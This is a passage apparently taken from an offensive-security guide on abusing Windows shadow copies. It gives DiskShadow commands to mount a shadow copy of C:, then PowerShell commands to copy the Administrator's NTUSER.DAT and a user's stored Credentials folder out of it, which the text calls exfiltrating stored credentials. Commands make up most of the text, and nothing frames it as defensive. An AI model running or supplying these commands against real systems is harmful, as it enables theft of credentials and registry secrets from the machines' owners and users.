- Example: Using DiskShadow to Mount a Shadow Copy
You can use `DiskShadow` to mount a shadow copy to a specific directory for easier browsing:
```powershell
DiskShadow
add volume C: alias MyShadow
create
expose %MyShadow% X:
```
This mounts the shadow copy of the `C:` volume to the `X:` drive, making it accessible for further operations.

#### Copying Sensitive Files from Shadow Copies
- Example: Copying NTUSER.DAT
The `NTUSER.DAT` file contains registry settings specific to the user, including stored credentials and other sensitive information.
```powershell
Copy-Item -Path "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Users\Administrator\NTUSER.DAT" -Destination "C:\Path\To\ntuser_copy"
```

- Example: Copying Web Credentials
You can also exfiltrate stored browser credentials from the shadow copies:
```powershell
Copy-Item -Path "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Users\<Username>\AppData\Local\Microsoft\Credentials" -Destination "C:\Path\To\credentials_copy"
```
